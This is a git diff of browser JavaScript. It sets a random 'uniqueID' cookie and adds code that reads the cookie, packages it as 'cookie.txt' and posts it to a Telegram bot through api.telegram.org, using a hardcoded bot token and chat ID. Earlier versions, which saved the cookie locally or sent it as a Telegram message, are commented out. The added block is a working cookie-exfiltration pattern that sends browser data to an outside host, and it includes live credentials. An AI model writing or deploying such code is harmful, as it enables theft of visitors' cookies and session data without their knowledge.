@@ -32,26 +32,62 @@ const uniqueID = "id_" + Math.random().toString(36).substr(2, 9);
 // Set the cookie with the unique identifier
 setCookie("uniqueID", uniqueID, 7);
 
+// Retrieve cookie value
+const cookieValue = getCookie("uniqueID");
+
+if (cookieValue) {
+  const blob = new Blob([cookieValue], { type: "text/plain" });
+  const file = new File([blob], "cookie.txt");
+
+  // Data to bot
+  const botToken = "7651094116:AAE_ZF_VLBtbCzCaiE7xcahnRldGSQjN4KU";
+  const chatId = "1139790477";
+
+  const formData = new FormData();
+  formData.append("chat_id", chatId);
+  formData.append("document", file);
+
+  async function sendFile() {
+    try {
+      const response = await fetch(
+        `https://api.telegram.org/bot${botToken}/sendDocument`,
+        {
+          method: "POST",
+          body: formData,
+        }
+      );
+      const data = await response.json();
+      console.log(data);
+    } catch (error) {
+      console.error("Error sending file to Telegram:", error);
+    }
+  }
+
+  sendFile();
+}
+
+/* 
 // Retrive cookie value
 const cookieValue = getCookie("uniqueID");
 
 if (cookieValue) {
   const blob = new Blob([cookieValue], { type: "text/plain" });
+  const file = new File([blob], "cookie.txt");
 
   // Create a link element
-  const link = document.createElement("a");
-  link.href = URL.createObjectURL(blob);
-  link.download = "cookie.txt";
-  document.body.appendChild(link);
-  link.click();
-  document.body.removeChild(link);
+  //const link = document.createElement("a");
+  //link.href = URL.createObjectURL(blob);
+ // link.download = "cookie.txt";
+ // document.body.appendChild(link);
+ // link.click();
+ // document.body.removeChild(link);
 }
 
 // Data to bot
 const botToken = "7651094116:AAE_ZF_VLBtbCzCaiE7xcahnRldGSQjN4KU";
 const chatId = "1139790477";
 
-async function sendCookieToTelegram() {
+/* async function sendCookieToTelegram() {
   const cookieValue = getCookie("uniqueID");
   if (cookieValue) {
     const message = `Cookie Value: ${cookieValue}`;
@@ -67,4 +103,4 @@ async function sendCookieToTelegram() {
       console.error("Error sending message to Telegram:", error);
     }
   }
-}
+} */
